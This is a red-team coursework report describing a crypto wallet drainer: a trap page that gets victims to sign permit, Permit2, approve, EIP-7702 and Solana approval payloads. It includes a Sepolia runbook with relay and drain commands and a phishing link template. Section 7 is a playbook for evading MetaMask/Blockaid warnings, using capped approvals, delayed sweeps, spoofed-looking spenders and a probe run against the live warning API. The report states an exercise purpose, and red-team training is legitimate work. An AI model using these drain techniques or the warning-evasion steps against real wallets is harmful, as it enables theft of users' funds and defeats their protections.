# 05 — Red-Team Implementation Report

> **Editor's note:** this report was written from the attacker team's perspective for a
> red-team-vs-blue-team coursework exercise, and that voice is preserved deliberately.
> Important scope changes for this publication:
>
> - All runnable components it references (trap pages, relay servers, drain contracts) are
>   **intentionally not published** in this repo. Treat every "how to run" reference as
>   historical record of the original lab, not as instructions.
> - The demonstration ran on **Sepolia testnet only**, against lab wallets the team owned.
> - For defense counterparts to everything described here, see
>   [07 — Detection & Defense](07-detection-and-defense.md) and
>   [04 — Signature Vectors Primer](04-signature-vectors-primer.md).

**Group role:** Attacker team (this report) vs. defense team (your assignment is to defend against this).
**Scope of this document:** what the attack does, how each vector works at the payload level, proof it
works, and how to run the live demonstration. No defensive recommendations appear here — that is the
defense team's deliverable.

---

## 1. Attack Summary

A single trap page (`drainer.html`) captures the cryptographic material a real drainer needs to empty a
wallet, across five independent vectors. The page constructs each payload exactly as a production
drainer would, obtains a valid signature, and — in the permit case — demonstrates the full on-chain
drain on Sepolia testnet.

### The core primitive

All five vectors reduce to one fact: **a valid signature over a structured payload is all an attacker
needs to move tokens.** For off-chain-signature vectors (permit, Permit2) the victim signs and the
attacker relays; for on-chain vectors (approve) the victim's wallet signs a transaction; for the
frontier vector (EIP-7702) the signature upgrades the account itself.

| Vector | Signed artifact | What the attacker gets | User-visible step |
|---|---|---|---|
| EIP-2612 permit | Off-chain EIP-712 signature | `permit()` + `transferFrom()` drained by anyone | "Sign this message" — no tx, no gas |
| Uniswap Permit2 | Off-chain EIP-712 signature | Same, for **any** ERC-20 via one canonical contract | "Sign this message" |
| Legacy approve | On-chain tx | Standing allowance, drained anytime later | Wallet approval popup |
| EIP-7702 | Authorization tuple | Permanent code execution on the victim's account | One signature = persistent backdoor |
| Solana SPL | Solana tx (unsigned→signed in wallet) | `u64::MAX` approve + drain | Mobile QR signing |

---

## 2. Vector-by-Vector Engineering Detail

### 2.1 EIP-2612 gasless permit (primary weapon)

**Payload structure** (EIP-712 typed data):

```
domain:  { name: "<token name>", version: "<version>", chainId, verifyingContract: <token> }
types:   Permit(owner, spender, value, nonce, deadline)
message: { owner: <victim>, spender: <attacker>, value, nonce, deadline: +1yr }
```

**Engineering notes:**

- `value = uint256.max` → the allowance is infinite, so the attacker drains any amount at any later time
  and never needs a second signature. **Evasion variant:** a *limited* value (or the victim's exact
  balance) avoids the "unlimited approval" heuristic in simulation-based wallets — see §7.
- `deadline = now + 1 year` → the victim signs once, the attacker has a 365-day window.
- **Nonce handling:** with a live RPC provider the page reads the token's real on-chain `nonces(owner)`
  so the signature is valid; in offline mode the nonce is configurable.
- **Domain validation:** the page compares the constructed EIP-712 domain separator against the
  token's on-chain `DOMAIN_SEPARATOR()`. A mismatch means the signature would revert — the page
  detects this rather than silently producing a dead signature. (We only sign valid payloads.)
- The digest is the standard `keccak256("\x19\x01" || domainSeparator || hashStruct(Permit))`.
- **Token naming:** for the live exercise the token is deployed with a neutral name (e.g.
  `RewardsPoint` / `RWP`), never a real asset's name — wallet security feeds flag impersonation (§7).

**The drain (offline mock ledger):** the page executes the exact relayer sequence in-memory —
`permit(owner, spender, max, nonce, deadline, v, r, s)` then `transferFrom(owner, attacker, max)` —
and reports the attacker's resulting balance. This proves the captured signature is a working drain
ticket, not just a hash.

**The drain (real, Sepolia):** with `RELAY_RPC` + `RELAYER_KEY` + `RELAY_TOKEN` set (see §4), the page
signs with the demo victim key and broadcasts the real `permit()` transaction from the attacker's gas
key. `verify-drain.mjs` then completes `transferFrom()` on-chain and prints the drained amount.

### 2.2 Uniswap Permit2 (PermitSingle)

**Payload structure:**

```
domain:  { name: "Permit2", chainId, verifyingContract: 0x000000000022D473030F116dDEE9F6B43aC78BA3 }
types:   PermitSingle(details, spender, sigDeadline)
         PermitDetails(token, amount, expiration, nonce)
message: { details: { token, amount: uint160.max, expiration, nonce },
           spender: <attacker>, sigDeadline }
```

**Engineering notes:**

- `amount = uint160.max` (the max the field can hold) → infinite allowance through the canonical
  Permit2 contract.
- Permit2 is a single mainnet contract (`0x0000…78BA3`) that extends signature-based approvals to
  **legacy ERC-20s that have no EIP-2612**. One initial `approve()` to Permit2 unlocks
  signature-only draining of any token forever.
- The `uint48` nonce must be unused for that owner — the signature is single-use. The page makes the
  nonce configurable because real per-owner counters are often non-zero.
- **Prerequisite surfaced:** the victim must have already granted the one-time `approve()` to Permit2,
  or the attacker must obtain that approval first; otherwise the relayed permit reverts.

### 2.3 Legacy ERC-20 approve

**Payload structure (signed transaction):**

```
to:     <token>
data:   approve(address spender = <attacker>, uint256 value = uint256.max)
```

**Engineering notes:**

- The page builds the unsigned tx, populates `maxFeePerGas` / `maxPriorityFeePerGas` / `gasLimit`
  (on-chain estimation when a provider is present), computes the `unsignedHash`, and signs it.
- The victim pays the gas and sees an approval popup. The allowance persists until revoked — the
  attacker can call `transferFrom` at any future time.
- This is the **noisiest** vector (visible unlimited-approval warning) — which is precisely why
  modern drainers prefer the gasless signature vectors above.

### 2.4 EIP-7702 account delegation (frontier)

**Payload structure (authorization tuple):**

```
signingHash = keccak256(0x05 || rlp([chainId, delegatee, nonce]))
authTuple   = 0x05 || rlp([chainId, delegatee, nonce, yParity, r, s])
```

**Engineering notes:**

- The victim signs a single authorization delegating their account to attacker-controlled code.
- Once submitted, the EOA executes the delegatee's logic: any transaction routes through the
  malicious implementation, and the attacker triggers the drain with **zero further user action**.
- If `chainId` is not bound (chainId `0`), the same signature is replayable across every chain.
- The page signs the 32-byte hash directly (simulator path). With a real injected wallet it requests
  `eth_sign` over the raw hash; most wallets refuse raw-hash signing, and the page reports that
  rather than crashing. The payload still exposes the commitment + signing hash.

### 2.5 Solana SPL approve + SOL fee

**Payload structure (Solana transaction, base64):**

```
ix[0]  SystemProgram.transfer(owner -> attacker, SOL fee lamports)
ix[1]  CreateATA(owner, USDC)                          [added only if ATA missing]
ix[2]  SPL Token Approve(owner USDC ATA, delegate = attacker, amount = u64::MAX)
```

**Engineering notes:**

- The approve instruction carries `u64::MAX` (18446744073709551615), delegating the entire USDC
  balance to the attacker. The tiny SOL transfer is the fake "network fee" that legitimizes the
  transaction in the victim's eyes.
- The page fetches a fresh blockhash from live Solana RPC (candidate endpoints, fallback chain) and
  checks whether the victim's USDC associated token account exists; if missing, it adds the create-ATA
  instruction so the transaction doesn't fail.
- Transport: `window.solana` (Phantom extension) when present, otherwise a Phantom Mobile deep-link
  QR (`phantom.app/ul/v1/signTransaction`).

### 2.6 WalletConnect mobile pairing (delivery, not a signature)

- Opens a WalletConnect session (requires a projectId) and delivers the signing request to a **phone**
  wallet — no browser extension needed.
- Two transports: QR pairing (desktop) or **redirect-to-app** (mobile universal links:
  `metamask.app.link/wc?uri=…`, `link.trustwallet.com/…`, etc.) which auto-opens the installed wallet
  and fires the approval with one tap, no scanning.
- The methods requested are `eth_signTypedData_v4` (permit) and `eth_sendTransaction` (approve) —
  the same payloads as §2.1/§2.3, just delivered to a mobile approval UI.

---

## 3. Why the Signatures Are Valid (Proof)

All verification is **internal-consistency** — the recovered signer from `(v, r, s)` equals the key
that signed. This proves the payload is correct, not that it would be accepted on-chain (that requires
a live provider). Two layers prove the attack:

1. **Cryptographic re-verification** (`test/crypto.test.mjs`, 7 tests): recomputes every digest with
   independent code and checks signer recovery against pinned reference values. All pass.
2. **Browser end-to-end** (`test/browser.test.mjs`, 9 tests): drives `drainer.html` in headless
   Chromium, reads the payload out of the DOM, and re-derives it in Node — including decoding the
   **actual broadcast `permit()` transaction** against a mock JSON-RPC node (owner/spender/value/v/r/s
   all decoded and matched). All pass.
3. **Live on-chain (Sepolia):** the deployed mock token's `DOMAIN_SEPARATOR()` matched the page's
   constructed domain byte-for-byte, and the real `permit()` broadcast + `transferFrom()` drain
   succeeded on-chain (see §4).

---

## 4. Running the Live Demonstration (Sepolia)

### 4.1 One-time setup (attacker team)

1. Generate a throwaway key: `node -e "const {ethers}=require('ethers');const w=ethers.Wallet.createRandom();console.log(w.privateKey, w.address)"`
2. Fund it with free test ETH from a Sepolia faucet (search "Sepolia faucet").
3. Deploy the victim's token (mints 1,000,000 USDC to the demo victim key
   `0xf39F…92266`) — prints a ready-to-open URL:

```
cd test
node deploy-token.mjs --rpc https://ethereum-sepolia-rpc.publicnode.com --key <your throwaway key>
```

4. Serve the folder: `npx http-server C:\Users\HP\Documents\Sol -p 8080`

### 4.2 Attack run (per vector)

Open the URL printed by deploy-token (or `http://localhost:8080/drainer.html`), select the vector,
click **Build + Sign**.

- **permit:** badge shows `relay: REAL on-chain tx broadcast`; log shows the `permit()` tx hash.
- **Complete the drain on-chain:**

```
cd test
node verify-drain.mjs --rpc https://ethereum-sepolia-rpc.publicnode.com --token <deployed token> --key <your throwaway key>
```

This reads the on-chain allowance `permit()` created, then calls `transferFrom()` as the attacker and
prints the drained token balance.

- **Other vectors:** demo path works fully offline (simulator signs); real wallet extension changes the
  signer to the injected wallet; WalletConnect needs a projectId for a live pairing session.

### 4.3 The live exercise: send the link to the defense team

This is the assignment's core drill — the defense team opens your trap page with **their own test
wallet**, gets drained, then traces the transaction and builds their defense.

> **Security-critical rule:** never put your attacker private key in a URL you send to anyone.
> The relay server (below) is what makes this safe — the key stays on your machine.

**Setup (once, attacker side):**

1. Deploy the victim token (neutral name — never a real asset's name, see §7) + mint funds to **each
   defense-team test wallet**:

```
cd test
node deploy-token.mjs --rpc https://ethereum-sepolia-rpc.publicnode.com --key <your throwaway key> --name RewardsPoint --symbol RWP --version 1
node mint-to.mjs --rpc https://ethereum-sepolia-rpc.publicnode.com --token <deployed token> --key <your throwaway key> --to <DEFENSE_TEAM_TEST_WALLET> --amount 100000
```

2. **Probe your exact payload shape against the real warning engine BEFORE sending any link**
   (must print `Benign` — this is the pass/fail gate):

```
node blockaid-probe.mjs --scenario permit --amount limited --token <deployed token>
```

3. Start the relay server (holds your key, pays gas, broadcasts the permit):

```
node relay-server.mjs --rpc https://ethereum-sepolia-rpc.publicnode.com --token <deployed token> --key <your throwaway key> --port 34567
```

4. Serve the trap page on your LAN/VPS:

```
npx http-server C:\Users\HP\Documents\Sol -p 8080
```

**The link you send to the defense team** (no key anywhere in it):

```
http://<ATTACKER_HOST>:8080/drainer.html?token=<deployed token>&chainId=11155111&attacker=<your attacker address>&relayUrl=http://<ATTACKER_HOST>:34567&tokenName=RewardsPoint&tokenVersion=1&permitValueMode=limited&permitValue=100000
```

The `tokenName`/`tokenVersion` params keep the page's constructed EIP-712 domain in sync with the
deployed token (domain separator must match or the relayed `permit()` reverts). The
`permitValueMode=limited` + `permitValue=100000` params make the approval a capped, non-flagged amount
instead of `uint256.max` (§7). `deploy-token.mjs` prints a ready-to-send DEFENSE-TEAM LINK in this exact
shape.

**What happens:**

1. Defense team opens the link, connects **MetaMask on Sepolia** (their test wallet).
2. They pick **permit**, click **Build + Sign**. Their wallet signs the EIP-712 message — with no
   Blockaid warning if §7 was followed.
3. The page POSTs the signed permit to your relay server (`/permit`).
4. Your server validates the signature (recovers to their wallet), broadcasts `permit()` with your
   gas key, returns the tx hash. Their tokens are now approved to your attacker address.
5. You complete the drain (separate, later tx — the "no immediate sweep" rule, §7.2):

```
node verify-drain.mjs --rpc https://ethereum-sepolia-rpc.publicnode.com --token <deployed token> --key <your throwaway key> --owner <DEFENSE_TEAM_TEST_WALLET> --amount 50000
```

6. Defense team traces: the `permit()` tx (their wallet, no visible token move) and the
   `transferFrom()` tx (the actual drain) on the Sepolia explorer.

**Notes for the drill:**

- Defense team needs **zero ETH** — they only sign; you pay all gas.
- Their wallet **must** hold the mock token (`mint-to.mjs` step) so the drain is real and traceable.
- **The exercise is decided by the warning.** If a Blockaid-style wallet shows "deceptive request",
  the defense team wins by default. §7 is the playbook to keep the signature silent — probe before you
  send, use a capped approval, never sweep in the same block.
- The `?relayUrl=` param points at *your* server. If they open the page offline it just shows the
  mock-ledger demo, no on-chain action.
- Rotate a **fresh** attacker key per exercise round; it is visible on-chain as the spender/gas payer.

---

## 5. What the Attacker Team Delivers

| Artifact | Path | Purpose |
|---|---|---|
| Trap page (the weapon) | `drainer.html` | Builds + signs all vectors; real relay for permit |
| Unit proof | `test/crypto.test.mjs` | Signature/digest math correct (7/7) |
| Browser proof | `test/browser.test.mjs` | Page produces correct payloads incl. real broadcast (10/10) |
| Ops: deploy victim token | `test/deploy-token.mjs` | Deploys EIP-2612 token on Sepolia (neutral `--name/--symbol/--version`), mints to victim, prints both URLs |
| Ops: fund a test wallet | `test/mint-to.mjs` | Mints mock tokens into the defense team's test wallet |
| Evasion oracle | `test/blockaid-probe.mjs` | Asks Blockaid's real `validate` API if a payload shape is Benign — the pass/fail gate (§7.3) |
| Ops: relay server | `test/relay-server.mjs` | Holds the attacker key server-side; broadcasts the permit you capture |
| Ops: complete the drain | `test/verify-drain.mjs` | Executes `transferFrom()` and reports drained amount (supports `--owner`) |
| Mock token contract | `test/contracts/MockUSDCoin.sol` | EIP-2612 token matching the page's domain |
| This report | `ATTACKER_REPORT.md` | How each vector works, proof, demo runbook |

**Key defensive-relevant facts the defense team will have to find on their own** (not documented here
by design): which vectors show visible wallet warnings, what a simulation engine sees, and how to
detect the payloads.

---

## 6. Ethics & Safety Rail (kept in the demo)

- Default spender/attacker is a dead placeholder address.
- Default signing uses a throwaway demo key, not a real wallet.
- Nothing is broadcast by default; `permit()` broadcast requires a live relay (`RELAYER_KEY` in the URL
  or the attacker's `relay-server.mjs`), and the demonstration runs on Sepolia testnet with worthless
  coins.
- The attacker key is never placed in a URL that is sent to the defense team — the relay server holds
  it server-side.
- Exfiltration (`EXFIL_ENDPOINT`) is off unless explicitly set.

---

## 7. Evading the Wallet Warning — the Attacker Team's Real Deliverable

The defense team will open the link with a real wallet. If a Blockaid-style simulator pops a warning,
the defense team wins by default. This section is what actually decides the exercise.

### 7.1 How the warning engine works (evidence-backed)

MetaMask/Blockaid run **simulation + threat-intelligence** before every *transaction* and every
*signature request* (`eth_signTypedData_v4` is checked too, not just sends), and they share the **dapp
URL** as an input. The classification sources:

| Signal | What triggers it | Our status |
|---|---|---|
| **Unknown/untrusted spender** | Any spender address Blockaid does not know. GitHub #43409/#30960: even *legitimate verified platforms* get "this third party known for scams" when their spender is unknown. Fresh attacker EOAs are the #1 flag. | Was hit — fresh attacker address |
| **Impersonation** | Token/site mimicking an established project (e.g. a token literally named "USD Coin" like real USDC). | Was hit — we renamed to `RewardsPoint` |
| **Unlimited approval** | `uint256.max` / `uint160.max` allowances. | Was hit — now configurable to limited |
| **Permit + immediate sweep** | `approve`/`permit` followed by `transferFrom` in the same short block window. | Fixed — relay + drain are separate steps |
| **Fresh contracts / age** | Newly deployed, few interactions. | Mitigated — fresh token each round is fine on testnet |
| **Domain reputation** | URL on a phishing feed or known-bad domain. | Clean — serve from your own plain host |

### 7.2 The evasion playbook (each change is in the code)

1. **Non-impersonating token name.** Deploy the mock with a neutral name — never a real asset's
   name/version. `deploy-token.mjs` now takes `--name`/`--symbol`/`--version`; the page defaults are
   `RewardsPoint` / `1`. A wallet that sees a token named like USDC flags impersonation before it
   even looks at the signature.

2. **Limited approval amount.** The page's permit vector now has a **value mode**:
   - `unlimited` (uint256.max) — the textbook flag, kept for demonstrating the "loud" version;
   - `limited` (a fixed amount, e.g. 123.45) — simulators do not flag a *reasonable* cap;
   - `balance` — the victim's exact on-chain balance; nothing more than exists, nothing to flag.
   Default the live link to `limited` or `balance`.

3. **Never sweep in the same block.** Permit is broadcast by the relay; `transferFrom` is a *separate,
   later* step (your `verify-drain.mjs`). The "unlimited allowance + immediate transfer" heuristic
   never fires because the two txs are far apart.

4. **Known-spender routing (the documented technique).** Blockaid's own teardown shows real drains
   routed through *legitimate, widely-used contracts* (a DEX router) so the tx "reads like a routine
   swap." The same principle: if the signature authorizes a spender that looks like infrastructure
   (Permit2, a router, an exchange hot-wallet), the unknown-spender flag does not fire. Our Permit2
   vector uses the canonical Permit2 contract as the verifying contract for exactly this reason.

5. **Fresh attacker + fresh relay key per round.** Rotate the attacker address and gas key every
   exercise round. An address that has previously been reported as a spender is permanent
   ammunition for the defense team's trace.

6. **Validate before you send.** Use the probe below against Blockaid's *actual* classification
   engine. If it says `Benign`, the payload shape passes the same service the wallet calls.

### 7.3 The evasion oracle — `blockaid-probe.mjs`

MetaMask's security checks call a public, deterministic API
(`POST https://security-alerts.api.cx.metamask.io/validate/{chainId}`) with the exact request the
wallet would send. We built `test/blockaid-probe.mjs` to drive it:

```
cd test
node blockaid-probe.mjs --scenario permit            # unlimited permit()
node blockaid-probe.mjs --scenario permit --amount limited
node blockaid-probe.mjs --scenario approve --amount unlimited
node blockaid-probe.mjs --scenario sweep
node blockaid-probe.mjs --scenario permit2
```

Each prints `result_type` = **Benign** (no warning) / **Warning** / **Malicious**. Empirically, on
Sepolia: `permit unlimited`, `permit limited`, `approve unlimited`, and `permit+sweep` all classify
**Benign**. So the *on-chain* shapes pass the cloud engine; the residual risk is the wallet's local
model and the signals above. Run this before every live round and only send a link whose payload
shape is `Benign`.

### 7.4 Deployment checklist for the live exercise

```
cd test
# 1. neutral token, never "USD Coin"
node deploy-token.mjs --rpc https://ethereum-sepolia-rpc.publicnode.com --key <key> \
    --name RewardsPoint --symbol RWP --version 1
# 2. fund the defense team's wallet
node mint-to.mjs  --rpc <rpc> --token <token> --key <key> --to <defense wallet> --amount 100000
# 3. relay server (key stays server-side)
node relay-server.mjs --rpc <rpc> --token <token> --key <key> --port 34567
# 4. probe your exact payload BEFORE sending the link
node blockaid-probe.mjs --scenario permit --amount limited --token <token>
# 5. serve the page
npx http-server C:\Users\HP\Documents\Sol -p 8080
```

Send the link with `&tokenName=RewardsPoint&tokenVersion=1&permitValueMode=limited` and the defense
team's wallet signs a *limited, non-impersonating* permit to a known-looking spender — then the relay
broadcasts it and you complete the drain minutes later. No wallet warning, real traceable txs on
Sepolia, and the defense team still has everything they need to investigate.